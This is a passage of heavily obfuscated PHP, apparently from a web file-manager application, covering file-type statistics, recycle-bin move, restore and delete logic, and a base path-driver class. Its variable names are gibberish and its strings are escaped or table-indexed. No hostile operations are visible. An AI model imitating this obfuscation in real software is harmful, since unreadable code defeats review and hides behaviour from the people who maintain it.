$õÒº£° = 0; $Ö«ú ³ = $this->targetSourceRoot($ê«òí´ö, $‘¨ûÆ³¯, !0); foreach ($Ö«ú ³ as $óˆß …) { if (!$óˆß …) { continue; } $õÒº£° += floatval($óˆß …[$ŒÏÄ‘û‡[78]]); $óÍê“„ë = array($ŒÏÄ‘û‡[630] => array($ŒÏÄ‘û‡[590], $ŒÏÄ‘û‡[573] . $óˆß …[$ŒÏÄ‘û‡[183]] . $ŒÏÄ‘û‡[591])); $ç£î±×Œ = Model($ŒÏÄ‘û‡[481])->field($ŒÏÄ‘û‡[469])->where($óÍê“„ë)->select(); $ç£î±×Œ = array_to_keyvalue($ç£î±×Œ, $ŒÏÄ‘û‡[12], $ŒÏÄ‘û‡[183]); $ç£î±×Œ = array_unique(array_filter($ç£î±×Œ)); if ($ç£î±×Œ) { $óÍê“„ë = array($ŒÏÄ‘û‡[469] => array($ŒÏÄ‘û‡[470], $ç£î±×Œ)); $õÒº£° += floatval($this->where($óÍê“„ë)->sum($ŒÏÄ‘û‡[78])); } } $õÒº£° = !$õÒº£° || $õÒº£° <= 0 ? 0 : $õÒº£°; return $õÒº£°; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Ûø·‡¦‡) { return $this->fileTypeProfile($Ûø·‡¦‡, SourceModel::TYPE_USER); } public function groupFileTypeProfile($êÖ²úóÈ) { return $this->fileTypeProfile($êÖ²úóÈ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ÁáËø, $•ùÆĞìª) { $æÕà’Éé =& $_SERVER[ú‡®¯¨±]; $à”³Îñ™ = $æÕà’Éé[2219] . $ÁáËø . $æÕà’Éé[11] . $•ùÆĞìª; $ƒæ¢Š›À = Cache::get($à”³Îñ™); if ($ƒæ¢Š›À) { return $ƒæ¢Š›À; } $¢°’©Û× = array($æÕà’Éé[624] => 0); if ($ÁáËø != !1) { $¢°’©Û×[$æÕà’Éé[548]] = $ÁáËø; $¢°’©Û×[$æÕà’Éé[180]] = $•ùÆĞìª; } $Äß¼‡ø– = array(); $Äß¼‡ø–[$æÕà’Éé[2220]] = array($æÕà’Éé[2221] => LNG($æÕà’Éé[2220]), $æÕà’Éé[2222] => $this->where($¢°’©Û×)->count(), $æÕà’Éé[595] => $this->where($¢°’©Û×)->sum($æÕà’Éé[78])); $šış½˜Ñ = KodIO::fileTypeList(); foreach ($šış½˜Ñ as $ùç†ËÕ => $ı³ÂÑĞ) { $¢°’©Û×[$æÕà’Éé[464]] = $this->fileTypeWhere($ùç†ËÕ); $Äß¼‡ø–[$ùç†ËÕ] = array($æÕà’Éé[2221] => $ı³ÂÑĞ[$æÕà’Éé[32]], $æÕà’Éé[2222] => $this->where($¢°’©Û×)->count(), $æÕà’Éé[595] => $this->where($¢°’©Û×)->sum($æÕà’Éé[78])); } Cache::set($à”³Îñ™, $Äß¼‡ø–, 1200); return $Äß¼‡ø–; } public function fileNameExist($÷åëÔëÅ, $”¬¡±¤‡) { $¬¡À¤™à =& $_SERVER[ú‡®¯¨±]; $öãÅç×Û = $this->field($¬¡À¤™à[2223])->where(array($¬¡À¤™à[182] => $÷åëÔëÅ, $¬¡À¤™à[32] => $”¬¡±¤‡, $¬¡À¤™à[483] => 0))->find(); return is_array($öãÅç×Û) ? $öãÅç×Û[$¬¡À¤™à[183]] : !1; } public function childList($ñã¤Ğ¹¬) { $·¿ÌçüÆ =& $_SERVER[ú‡®¯¨±]; $İ¸‹¡ôæ = $·¿ÌçüÆ[2196] . $ñã¤Ğ¹¬; if (isset(self::$cacheChildList[$İ¸‹¡ôæ])) { return self::$cacheChildList[$İ¸‹¡ôæ]; } $â£Š÷øÒ = array($·¿ÌçüÆ[182] => intval($ñã¤Ğ¹¬), $·¿ÌçüÆ[483] => 0); $ŞÌ¾¶Î¬ = $this->where($â£Š÷øÒ)->select(); $ŞÌ¾¶Î¬ = $ŞÌ¾¶Î¬ ? $ŞÌ¾¶Î¬ : array(); self::$cacheChildList[$İ¸‹¡ôæ] = $ŞÌ¾¶Î¬; foreach ($ŞÌ¾¶Î¬ as $Ğ®Ş™šÕ) { $İ¸‹¡ôæ = $·¿ÌçüÆ[511] . $Ğ®Ş™šÕ[$·¿ÌçüÆ[183]]; self::$cacheSourceInfo[$İ¸‹¡ôæ] = $Ğ®Ş™šÕ; } return $ŞÌ¾¶Î¬; } public function fileNameAuto($¿ìÙôèŒ, $›ú‰»«÷, $Œ±ù‹– = REPEAT_RENAME, $ğ×î€êª = false) { $×„™£ª™ =& $_SERVER[ú‡®¯¨±]; $Åñ»®ïõ = get_path_ext($›ú‰»«÷); $ı™‘Êü = $Åñ»®ïõ ? basename($›ú‰»«÷, $×„™£ª™[10] . $Åñ»®ïõ) . $×„™£ª™[2224] . $Åñ»®ïõ : $›ú‰»«÷ . $×„™£ª™[438]; $ßˆõ¦Ê¯ = array($×„™£ª™[182] => $¿ìÙôèŒ, $×„™£ª™[483] => 0, $×„™£ª™[32] => array($×„™£ª™[437], $ı™‘Êü)); $´®©÷Ø× = $this->field($×„™£ª™[32])->where($ßˆõ¦Ê¯)->select(); $Ÿ’Óî¡Œ = array_to_keyvalue($´®©÷Ø×, $×„™£ª™[12], $×„™£ª™[32]); return $this->fileNameAutoGet($Ÿ’Óî¡Œ, $›ú‰»«÷, $Œ±ù‹–, $ğ×î€êª); } public function fileNameAutoGet($Ûë¯îñ, $–‰Ê°©, $ääºÊ€, $Æíƒ—íĞ) { $ÏùèšÛÂ =& $_SERVER[ú‡®¯¨±]; if ($ääºÊ€ == REPEAT_REPLACE || !$Ûë¯îñ || !in_array_not_case($–‰Ê°©, $Ûë¯îñ) || $Æíƒ—íĞ && $ääºÊ€ != REPEAT_RENAME_FOLDER) { return $–‰Ê°©; } if ($ääºÊ€ == REPEAT_SKIP) { return !1; } $”«Åôµ¯ = $ÏùèšÛÂ[10] . get_path_ext($–‰Ê°©); $”«Åôµ¯ = $”«Åôµ¯ == $ÏùèšÛÂ[10] || $Æíƒ—íĞ ? $ÏùèšÛÂ[12] : $”«Åôµ¯; for ($æª¢ùŸ = 1; $æª¢ùŸ <= count($Ûë¯îñ) + 1; $æª¢ùŸ++) { $ŸÎ®ÍŞ¤ = substr($–‰Ê°©, 0, strlen($–‰Ê°©) - strlen($”«Åôµ¯)); $‹Ó‡¹áà = $ŸÎ®ÍŞ¤ . "\x28{$æª¢ùŸ}\51{$”«Åôµ¯}"; if (!in_array_not_case($‹Ó‡¹áà, $Ûë¯îñ)) { return $‹Ó‡¹áà; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\162\143\x65\137\x72\145\x63\x79\x63\154\x65"; protected $dataAuto = array(array("\143\x72\x65\141\x74\x65\x54\151\155\x65", "\164\x69\x6d\145", "\x69\156\x73\x65\x72\164", "\x66\x75\156\x63\x74\x69\x6f\x6e")); public function listData($ç¢°ƒ„ä = false) { $¡•ŞÊÍ =& $_SERVER[ú‡®¯¨±]; $ç¢°ƒ„ä = $ç¢°ƒ„ä ? $ç¢°ƒ„ä : USER_ID; $…”ÌÏÊ— = $this->where(array($¡•ŞÊÍ[1699] => $ç¢°ƒ„ä))->select(); return array_to_keyvalue($…”ÌÏÊ—, $¡•ŞÊÍ[12], $¡•ŞÊÍ[183]); } public function moveToRecycle($µ¨±úÙà) { $ó¤›’®¸ =& $_SERVER[ú‡®¯¨±]; $µ†½”÷Ÿ = Model($ó¤›’®¸[1389]); $Á¢÷İ„ø = $µ†½”÷Ÿ->sourceInfo($µ¨±úÙà); if (!$Á¢÷İ„ø || $Á¢÷İ„ø[$ó¤›’®¸[483]] == $ó¤›’®¸[90]) { return; } $Ìá‡˜® = array($ó¤›’®¸[469] => $µ¨±úÙà, $ó¤›’®¸[1699] => USER_ID, $ó¤›’®¸[626] => $Á¢÷İ„ø[$ó¤›’®¸[180]], $ó¤›’®¸[627] => $Á¢÷İ„ø[$ó¤›’®¸[548]], $ó¤›’®¸[630] => $Á¢÷İ„ø[$ó¤›’®¸[563]]); $this->add($Ìá‡˜®); $this->recycleMove($µ¨±úÙà, 1); if ($Á¢÷İ„ø[$ó¤›’®¸[463]] == $ó¤›’®¸[90]) { $İÙĞ‡™„ = array($ó¤›’®¸[630] => array($ó¤›’®¸[590], $Á¢÷İ„ø[$ó¤›’®¸[563]] . $µ¨±úÙà . $ó¤›’®¸[591])); $µ†½”÷Ÿ->where($İÙĞ‡™„)->setField($ó¤›’®¸[483], 1); } } public function clear() { $this->remove(!1); } public function remove($Ú«œ­±ô = false, $€ÜÇ¸ŸÉ = false) { $œÒÂÖÅµ =& $_SERVER[ú‡®¯¨±]; $€ÜÇ¸ŸÉ = $€ÜÇ¸ŸÉ ? $€ÜÇ¸ŸÉ : USER_ID; $ÊÊÁ = Model($œÒÂÖÅµ[1389]); $™ÜœÈí = $this->listData($€ÜÇ¸ŸÉ); $Ú«œ­±ô = $Ú«œ­±ô === !1 ? !1 : $Ú«œ­±ô; $ŠÏ¿ÀØÅ = array(); foreach ($™ÜœÈí as $ÁöÒ–ö£) { if ($Ú«œ­±ô != !1 && !in_array($ÁöÒ–ö£, $Ú«œ­±ô)) { continue; } $‹¤ı÷±× = $ÊÊÁ->sourceInfo($ÁöÒ–ö£); $ÊÊÁ->remove($ÁöÒ–ö£, !1); $¨æË˜× = $‹¤ı÷±×[$œÒÂÖÅµ[180]] . $œÒÂÖÅµ[11] . $‹¤ı÷±×[$œÒÂÖÅµ[548]]; $ŠÏ¿ÀØÅ[$¨æË˜×] = array($œÒÂÖÅµ[626] => $‹¤ı÷±×[$œÒÂÖÅµ[180]], $œÒÂÖÅµ[548] => $‹¤ı÷±×[$œÒÂÖÅµ[548]]); $this->where(array($œÒÂÖÅµ[183] => $ÁöÒ–ö£))->delete(); } foreach ($ŠÏ¿ÀØÅ as $ß÷ÌÁ‡ü) { $ÊÊÁ->targetSpaceUpdate($ß÷ÌÁ‡ü[$œÒÂÖÅµ[180]], $ß÷ÌÁ‡ü[$œÒÂÖÅµ[548]]); } } public function restore($ØÔ¨æĞ¿ = false) { $Îé¢Ó’Ã = $this->listData(); $this->_restoreSource($Îé¢Ó’Ã, $ØÔ¨æĞ¿); } public function removeUserAll($½Ê¢±Ò) { $this->remove(!1, $½Ê¢±Ò); } public function restoreItem($ÔìùºƒÄ) { $this->_restoreSource(array($ÔìùºƒÄ), array($ÔìùºƒÄ)); } private function _restoreSource($ç‹š„ÑÀ, $ş«©¸©€) { $ÉµÃƒ„Ÿ =& $_SERVER[ú‡®¯¨±]; $£ıÜ³³Ù = Model($ÉµÃƒ„Ÿ[1389]); $ş«©¸©€ = $ş«©¸©€ == !1 ? !1 : $ş«©¸©€; if (!$ç‹š„ÑÀ) { return !0; } $ñç‚£Ÿ = array(); foreach ($ç‹š„ÑÀ as $İ•šïÓá) { if ($ş«©¸©€ != !1 && !in_array($İ•šïÓá, $ş«©¸©€)) { continue; } $À“–üªõ = $£ıÜ³³Ù->sourceInfo($İ•šïÓá); $±Ùñº¶µ = $£ıÜ³³Ù->sourceInfo($À“–üªõ[$ÉµÃƒ„Ÿ[182]]); if ($±Ùñº¶µ[$ÉµÃƒ„Ÿ[483]] == $ÉµÃƒ„Ÿ[90]) { continue; } $£ıÜ³³Ù->lockMoveStart($İ•šïÓá); $this->recycleMove($İ•šïÓá, 0); if ($À“–üªõ[$ÉµÃƒ„Ÿ[463]] == $ÉµÃƒ„Ÿ[90]) { $¦‰Ş‘õÃ = array($ÉµÃƒ„Ÿ[630] => array($ÉµÃƒ„Ÿ[590], $À“–üªõ[$ÉµÃƒ„Ÿ[563]] . $İ•šïÓá . $ÉµÃƒ„Ÿ[591])); $£ıÜ³³Ù->where($¦‰Ş‘õÃ)->setField($ÉµÃƒ„Ÿ[483], 0); $this->restoreFolderChildren($İ•šïÓá, $ç‹š„ÑÀ); } $this->where(array($ÉµÃƒ„Ÿ[183] => $İ•šïÓá))->delete(); $£ıÜ³³Ù->folderSizeReset($À“–üªõ[$ÉµÃƒ„Ÿ[182]]); $ñç‚£Ÿ[] = $À“–üªõ[$ÉµÃƒ„Ÿ[182]]; if ($À“–üªõ[$ÉµÃƒ„Ÿ[463]] == $ÉµÃƒ„Ÿ[90]) { $ñç‚£Ÿ[] = $İ•šïÓá; } $£ıÜ³³Ù->lockMoveEnd($İ•šïÓá); } $£ıÜ³³Ù->updateModifyTime($ñç‚£Ÿ); } private function restoreFolderChildren($ò¢ÕĞ¬ß, $ÖÕÕùë–) { $¨Õ¤³á =& $_SERVER[ú‡®¯¨±]; $ÙÜ–œÂ€ = Model($¨Õ¤³á[1389]); $«…›¢˜‹ = array($¨Õ¤³á[183] => array($¨Õ¤³á[7], array())); foreach ($ÖÕÕùë– as $û²¥¡†¤) { if ($û²¥¡†¤ == $ò¢ÕĞ¬ß) { continue; } if (!$ÙÜ–œÂ€->isParentOf($ò¢ÕĞ¬ß, $û²¥¡†¤)) { continue; } $ÍÙèÔ = $ÙÜ–œÂ€->sourceInfo($û²¥¡†¤); if ($ÍÙèÔ[$¨Õ¤³á[463]] == $¨Õ¤³á[90]) { $«…›¢˜‹[] = array($¨Õ¤³á[630] => array($¨Õ¤³á[590], $ÍÙèÔ[$¨Õ¤³á[563]] . $û²¥¡†¤ . $¨Õ¤³á[591])); } else { $«…›¢˜‹[$¨Õ¤³á[183]][1][] = $û²¥¡†¤; } } if (!$«…›¢˜‹[$¨Õ¤³á[183]][1]) { unset($«…›¢˜‹[$¨Õ¤³á[183]]); } if (!$«…›¢˜‹) { return; } if (is_array($«…›¢˜‹[$¨Õ¤³á[183]]) && is_array($«…›¢˜‹[$¨Õ¤³á[183]][1])) { $«…›¢˜‹[$¨Õ¤³á[183]][1] = array_unique($«…›¢˜‹[$¨Õ¤³á[183]][1]); } $«…›¢˜‹[$¨Õ¤³á[1056]] = $¨Õ¤³á[2004]; $ÙÜ–œÂ€->where($«…›¢˜‹)->setField($¨Õ¤³á[483], 1); } private function recycleMove($é†âœ÷û, $Ş³«£õ™ = 1) { $ÀÚ³•ÑÒ =& $_SERVER[ú‡®¯¨±]; $÷•ù³ÉÉ = Model($ÀÚ³•ÑÒ[1389]); $†õ¦ºğ = Model($ÀÚ³•ÑÒ[2225]); $ÌÛ½¨†ú = array($ÀÚ³•ÑÒ[183] => $é†âœ÷û); if ($Ş³«£õ™) { $÷•ù³ÉÉ->where($ÌÛ½¨†ú)->setField($ÀÚ³•ÑÒ[483], 1); $†õ¦ºğ->eventRecycle($é†âœ÷û, $ÀÚ³•ÑÒ[2226]); } else { $Ñìï«óÖ = $÷•ù³ÉÉ->where($ÌÛ½¨†ú)->find(); $²÷ô®õ× = $Ñìï«óÖ[$ÀÚ³•ÑÒ[463]] == $ÀÚ³•ÑÒ[90]; $ÚÈÛé÷Ñ = $÷•ù³ÉÉ->fileNameAuto($Ñìï«óÖ[$ÀÚ³•ÑÒ[182]], $Ñìï«óÖ[$ÀÚ³•ÑÒ[32]], REPEAT_RENAME_FOLDER, $²÷ô®õ×); if ($ÚÈÛé÷Ñ != $Ñìï«óÖ[$ÀÚ³•ÑÒ[32]]) { $÷•ù³ÉÉ->rename($é†âœ÷û, $ÚÈÛé÷Ñ); } $÷•ù³ÉÉ->where($ÌÛ½¨†ú)->setField($ÀÚ³•ÑÒ[483], 0); $†õ¦ºğ->eventRecycle($é†âœ÷û, $ÀÚ³•ÑÒ[2227]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\x73\157\165\x72\x63\x65\123\145\x63\162\x65\x74\114\151\x73\164"; public $field = array("\x73\157\x75\162\143\145\111\104", "\164\x79\x70\x65\111\x44", "\143\x72\x65\141\164\145\125\163\145\162"); } goto CÛè‘³ƒ…ë; D‚ˆİ©ÚÁ¬: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ì°‘Ø”ã =& $_SERVER[ú‡®¯¨±]; $this->objectDriver = array($ì°‘Ø”ã[60], $ì°‘Ø”ã[61], $ì°‘Ø”ã[62], $ì°‘Ø”ã[63], $ì°‘Ø”ã[64], $ì°‘Ø”ã[65], $ì°‘Ø”ã[66], $ì°‘Ø”ã[67], $ì°‘Ø”ã[68], $ì°‘Ø”ã[69], $ì°‘Ø”ã[70]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($èÀ²Î«) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($èÀ²Î«, $_SERVER[ú‡®¯¨±][8]); } return $èÀ²Î«; } public function iconvApp($È‚²ÎÇĞ) { return $È‚²ÎÇĞ; } public function iconvSystem($ªËôÂˆı) { return $ªËôÂˆı; } public function iconvTo($ÙµİŞÄ”, $³®û ¨Ì, $äé§»‰¯) { $‚“ÜíÆ =& $_SERVER[ú‡®¯¨±]; if (!$ÙµİŞÄ” || !function_exists($‚“ÜíÆ[71])) { return $ÙµİŞÄ”; } static $Ÿ™˜áËƒ = array(); $ş–ÖäÊà = $³®û ¨Ì . $‚“ÜíÆ[72] . $äé§»‰¯ . $‚“ÜíÆ[73] . $ÙµİŞÄ”; if (isset($Ÿ™˜áËƒ[$ş–ÖäÊà])) { return $Ÿ™˜áËƒ[$ş–ÖäÊà]; } if (function_exists($‚“ÜíÆ[74])) { $¼êŸ«ßÆ = @mb_convert_encoding($ÙµİŞÄ”, $äé§»‰¯, $³®û ¨Ì); } else { $¼êŸ«ßÆ = @iconv($³®û ¨Ì, $äé§»‰¯, $ÙµİŞÄ”); } $¼êŸ«ßÆ = $¼êŸ«ßÆ ? $¼êŸ«ßÆ : $ÙµİŞÄ”; if (strstr($¼êŸ«ßÆ, $‚“ÜíÆ[75])) { $¼êŸ«ßÆ = str_replace($‚“ÜíÆ[75], $‚“ÜíÆ[11], $¼êŸ«ßÆ); } $Ÿ™˜áËƒ[$³®û ¨Ì . $‚“ÜíÆ[72] . $äé§»‰¯ . $‚“ÜíÆ[73] . $ÙµİŞÄ”] = $¼êŸ«ßÆ; $Ÿ™˜áËƒ[$äé§»‰¯ . $‚“ÜíÆ[72] . $³®û ¨Ì . $‚“ÜíÆ[73] . $ÙµİŞÄ”] = $ÙµİŞÄ”; $Ÿ™˜áËƒ[$äé§»‰¯ . $‚“ÜíÆ[72] . $³®û ¨Ì . $‚“ÜíÆ[73] . $¼êŸ«ßÆ] = $ÙµİŞÄ”; $Ÿ™˜áËƒ[$³®û ¨Ì . $‚“ÜíÆ[72] . $äé§»‰¯ . $‚“ÜíÆ[73] . $¼êŸ«ßÆ] = $¼êŸ«ßÆ; return $¼êŸ«ßÆ; } public function getPathInner($İ„øû×ß) { $­ùËŸêÊ = IO::init($İ„øû×ß); return $­ùËŸêÊ->path; } public function getPathOuter($ÂéÀ”ÊË) { $„õÄ»Ñ  =& $_SERVER[ú‡®¯¨±]; $Ô£è˜»¸ = strlen(trim($this->pathBase, $„õÄ»Ñ [8])); $ÂéÀ”ÊË = substr(trim($ÂéÀ”ÊË, $„õÄ»Ñ [8]), $Ô£è˜»¸); return $this->pathDriver . $„õÄ»Ñ [8] . ltrim($ÂéÀ”ÊË, $„õÄ»Ñ [8]); } public function isParentOf($²›Ö°â, $¬ûö–»÷) { $ßØÀêÚÒ =& $_SERVER[ú‡®¯¨±]; $²›Ö°â = rtrim(strtolower($²›Ö°â), $ßØÀêÚÒ[8]) . $ßØÀêÚÒ[8]; $¬ûö–»÷ = rtrim(strtolower($¬ûö–»÷), $ßØÀêÚÒ[8]) . $ßØÀêÚÒ[8]; $ïÃùö‡¤ = strpos($¬ûö–»÷, $²›Ö°â) === 0; return $ïÃùö‡¤; } public function getType() { $¥°ßó÷€ =& $_SERVER[ú‡®¯¨±]; $ú›Íµ‹È = str_replace($¥°ßó÷€[76], $¥°ßó÷€[12], get_class($this)); return strtolower($ú›Íµ‹È); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($öÕÙÅ, $ãƒˆÕĞ) { $çÓ–ŠÑ‹ =& $_SERVER[ú‡®¯¨±]; $Ó‡İë¾Ã = rtrim($öÕÙÅ, $çÓ–ŠÑ‹[8]) . $çÓ–ŠÑ‹[8] . $ãƒˆÕĞ; $³øæ×Š = $this->exist($Ó‡İë¾Ã); return $³øæ×Š ? $Ó‡İë¾Ã : !1; } public function setModifyTime($”®ÛßÂÉ, $ä§ÓÍ”Í = '') { } public function renameObject($ÃÀôıÏ¶, $ˆâŸå) { $ÆıìÔÌ· = $ˆâŸå; $ÃÀôıÏ¶ = $this->getPathOuter($ÃÀôıÏ¶); $ˆâŸå = $this->pathFather($ÃÀôıÏ¶) . $ˆâŸå; $©Û²½Ğ’ = IO::copy($ÃÀôıÏ¶, $this->pathFather($ÃÀôıÏ¶), REPEAT_RENAME_FOLDER, $ÆıìÔÌ·); if ($©Û²½Ğ’) { IO::remove($ÃÀôıÏ¶); } return $©Û²½Ğ’ ? $ˆâŸå : !1; } public function tempFile($“íÚì– = '', $ÈÃ£Ô“˜ = '') { if (!$“íÚì–) { $“íÚì– = rand_string(15); } $Û´êÈÑ = TEMP_FILES . rand_string(15) . $_SERVER[ú‡®¯¨±][8]; @mkdir($Û´êÈÑ, DEFAULT_PERRMISSIONS, !0); $›Š’ÙÏÆ = $Û´êÈÑ . $“íÚì–; @touch($›Š’ÙÏÆ); if ($ÈÃ£Ô“˜) { file_put_contents($›Š’ÙÏÆ, $ÈÃ£Ô“˜); } return $›Š’ÙÏÆ; } public function tempFileRemve($£Æ›‰¨è) { @unlink($£Æ›‰¨è); @rmdir($this->pathFather($£Æ›‰¨è)); } public function mkfile($À›¨¾ƒØ, $ú¸®£Ø¥ = '', $ÉßîÖ¦ó = REPEAT_RENAME) { } public function mkdir($’å•Á¤ö, $öË‘Â¨Á = REPEAT_SKIP) { } public function delFile($î°¼Ï¬ˆ) { } public function delFolder($êã€¬ÇÆ) { } public function copyFile($ĞÁÒÉì´, $ß³ğ¨ß¡) { } public function moveFile($¡«•óƒ, $£»Ù®ƒ„) { } public function remove($ñ„±ªàè) { if ($this->isFile($ñ„±ªàè)) { return $this->delFile($ñ„±ªàè); } return $this->delFolder($ñ„±ªàè); } public function rename($—ààËÙ°, $äšåÔÏ›) { } public function exist($Ê–õ©ì) { } public function findByHash($Óœì×¯‘ = '', $€²ñÑ†Š = '') { return !1; } public function isFile($ÙÀóöšœ) { } public function isFolder($µñù®Ÿ’) { } public function size($Ë³ïË) { } public function info($ìĞ½Ğê´) { } public function infoSimple($í¤‘½…˜) { return $this->info($í¤‘½…˜); } public function infoAuth($¹æ‹¾¨¬) { return $this->info($¹æ‹¾¨¬); } public function infoFull($éìÓŠ˜Ó) { return $this->info($éìÓŠ˜Ó); } public function infoFullSimple($Õ˜ƒ»Îä) { return $this->info($Õ˜ƒ»Îä); } public function infoWithChildren($–‡®ğÎœ) { $ê™ê¼ïŒ =& $_SERVER[ú‡®¯¨±]; static $³ƒ£·ÎŸ = array(); if (isset($³ƒ£·ÎŸ[$–‡®ğÎœ])) { return $³ƒ£·ÎŸ[$–‡®ğÎœ]; } $“Â‰ù  = $this->info($–‡®ğÎœ); if ($“Â‰ù  && $“Â‰ù [$ê™ê¼ïŒ[33]] == $ê™ê¼ïŒ[77]) { $®ĞíÒŒ› = array($ê™ê¼ïŒ[78] => 0, $ê™ê¼ïŒ[79] => 0, $ê™ê¼ïŒ[80] => 0); $this->infoChildren($–‡®ğÎœ, $®ĞíÒŒ›); $“Â‰ù [$ê™ê¼ïŒ[78]] = $®ĞíÒŒ›[$ê™ê¼ïŒ[78]]; $“Â‰ù [$ê™ê¼ïŒ[81]] = array($ê™ê¼ïŒ[82] => $®ĞíÒŒ›[$ê™ê¼ïŒ[79]], $ê™ê¼ïŒ[83] => $®ĞíÒŒ›[$ê™ê¼ïŒ[80]]); $³ƒ£·ÎŸ[$–‡®ğÎœ] = $“Â‰ù ; } return $“Â‰ù ; } public function listPath($‚¸úÙ¬ï, $õöã£¢ = false) { } public function has($…Ç§­Àö, $Ó²’ŠÌ˜ = false, $ÜŸÉÚêƒ = false) { } public function canRead($ä™‘‹æ®) { } public function canWrite($§Ôîàáë) { } public function getContent($ïú€àÜ) { } public function setContent($‡€ƒ—âÊ, $ÈÒŠ®Ù = '') { } protected function infoChildren($½‘¡ğ‰§, &$Ô€Ï¶è) { $Öšì­… =& $_SERVER[ú‡®¯¨±]; check_abort_echo(); $ˆÂÓÆ¬Ş = $this->listPath($½‘¡ğ‰§, !0); $ˆÂÓÆ¬Ş = array_merge($ˆÂÓÆ¬Ş[$Öšì­…[84]], $ˆÂÓÆ¬Ş[$Öšì­…[85]]); foreach ($ˆÂÓÆ¬Ş as $ÉÙ²“Èµ) { if ($ÉÙ²“Èµ[$Öšì­…[33]] == $Öšì­…[77]) { $Ô€Ï¶è[$Öšì­…[80]]++; $úßê£–Ã = $this->getPathInner($ÉÙ²“Èµ[$Öšì­…[86]]); $this->infoChildren($úßê£–Ã, $Ô€Ï¶è); } else { $Ô€Ï¶è[$Öšì­…[79]]++; $Ô€Ï¶è[$Öšì­…[78]] += $ÉÙ²“Èµ[$Öšì­…[78]]; } } } public function fileSubstr($³ĞƒÛå—, $Óæö¶¸­, $ˆó´é¹Æ) { } public function listAll($Ñ§…¥Íö) { } public function listAllMake($®Çüå¤, &$¨ÎÖ´ˆ’) { $Š€‡”• =& $_SERVER[ú‡®¯¨±]; check_abort_echo(); $ôŸèË¨„ = $this->listPath($®Çüå¤, !0); if (!$ôŸèË¨„) { return; } $ÑŸ´úÙ = array_merge($ôŸèË¨„[$Š€‡”•[84]], $ôŸèË¨„[$Š€‡”•[85]]); foreach ($ÑŸ´úÙ as $È‡¹¢½¼) { $È½ˆáı = $È‡¹¢½¼[$Š€‡”•[33]] == $Š€‡”•[77]; $£É²ì¨à = array($Š€‡”•[86] => $È‡¹¢½¼[$Š€‡”•[86]], $Š€‡”•[77] => $È½ˆáı); if (isset($È‡¹¢½¼[$Š€‡”•[78]])) { $£É²ì¨à[$Š€‡”•[78]] = $È‡¹¢½¼[$Š€‡”•[78]]; } if (isset($È‡¹¢½¼[$Š€‡”•[87]])) { $£É²ì¨à[$Š€‡”•[87]] = $È‡¹¢½¼[$Š€‡”•[87]]; } if (!$È½ˆáı) { $¨ÎÖ´ˆ’[] = $£É²ì¨à; continue; } $¨ÎÖ´ˆ’[] = $£É²ì¨à; $ÃĞ°–Ö = $È‡¹¢½¼[$Š€‡”•[86]]; $†ú¼ôÃ¶ = $this->pathDriver; if (substr($È‡¹¢½¼[$Š€‡”•[86]], 0, strlen($†ú¼ôÃ¶)) == $†ú¼ôÃ¶) { $ÃĞ°–Ö = substr($ÃĞ°–Ö, strlen($†ú¼ôÃ¶)); } $this->listAllMake($ÃĞ°–Ö, $¨ÎÖ´ˆ’); } } public function listAllSimple($ò£ƒÇ•¨, $ãÄ¨ïªÅ = false) { $øñ¯³ûÏ = $this->listAll($ò£ƒÇ•¨); return $this->listAllSimpleMake($øñ¯³ûÏ, $this->getPathOuter($ò£ƒÇ•¨), $ãÄ¨ïªÅ); } public function listAllSimpleMake($áÎ”ãÉò, $óÕÙ¹Í, $ªÄÂ›„õ) { $çàÔ¨çë =& $_SERVER[ú‡®¯¨±]; $‚çŸ®¯× = array(); $óÕÙ¹Í = rtrim(get_path_father($óÕÙ¹Í), $çàÔ¨çë[8]) . $çàÔ¨çë[8]; foreach ($áÎ”ãÉò as $Ï§ÇÁÔ) { $±èæ½Û  = array($çàÔ¨çë[86] => $Ï§ÇÁÔ[$çàÔ¨çë[86]], $çàÔ¨çë[88] => $Ï§ÇÁÔ[$çàÔ¨çë[86]], $çàÔ¨çë[77] => $Ï§ÇÁÔ[$çàÔ¨çë[77]]); if (isset($Ï§ÇÁÔ[$çàÔ¨çë[78]]) && !$Ï§ÇÁÔ[$çàÔ¨çë[77]]) { $±èæ½Û [$çàÔ¨çë[78]] = $Ï§ÇÁÔ[$çàÔ¨çë[78]]; } if (isset($Ï§ÇÁÔ[$çàÔ¨çë[87]])) { $±èæ½Û [$çàÔ¨çë[87]] = $Ï§ÇÁÔ[$çàÔ¨çë[87]]; } if (is_array($Ï§ÇÁÔ[$çàÔ¨çë[89]])) { $±èæ½Û [$çàÔ¨çë[88]] = $Ï§ÇÁÔ[$çàÔ¨çë[89]][$çàÔ¨çë[86]]; $±èæ½Û [$çàÔ¨çë[78]] = $Ï§ÇÁÔ[$çàÔ¨çë[89]][$çàÔ¨çë[78]]; $±èæ½Û [$çàÔ¨çë[87]] = $Ï§ÇÁÔ[$çàÔ¨çë[89]][$çàÔ¨çë[87]]; } else { if (substr($Ï§ÇÁÔ[$çàÔ¨çë[86]], 0, strlen($óÕÙ¹Í)) == $óÕÙ¹Í) { $±èæ½Û [$çàÔ¨çë[86]] = substr($Ï§ÇÁÔ[$çàÔ¨çë[86]], strlen($óÕÙ¹Í)); } } $œı¶İ™Õ = $Ï§ÇÁÔ[$çàÔ¨çë[77]] ? $çàÔ¨çë[8] : $çàÔ¨çë[12]; $±èæ½Û [$çàÔ¨çë[88]] = rtrim($±èæ½Û [$çàÔ¨çë[88]], $çàÔ¨çë[8]) . $œı¶İ™Õ; $±èæ½Û [$çàÔ¨çë[86]] = $çàÔ¨çë[8] . trim($±èæ½Û [$çàÔ¨çë[86]], $çàÔ¨çë[8]) . $œı¶İ™Õ; if (!$ªÄÂ›„õ) { $¶”ò¬´é = explode($çàÔ¨çë[8], trim($±èæ½Û [$çàÔ¨çë[86]], $çàÔ¨çë[8])); $±èæ½Û [$çàÔ¨çë[86]] = $çàÔ¨çë[8] . implode($çàÔ¨çë[8], array_slice($¶”ò¬´é, 1)) . $œı¶İ™Õ; } 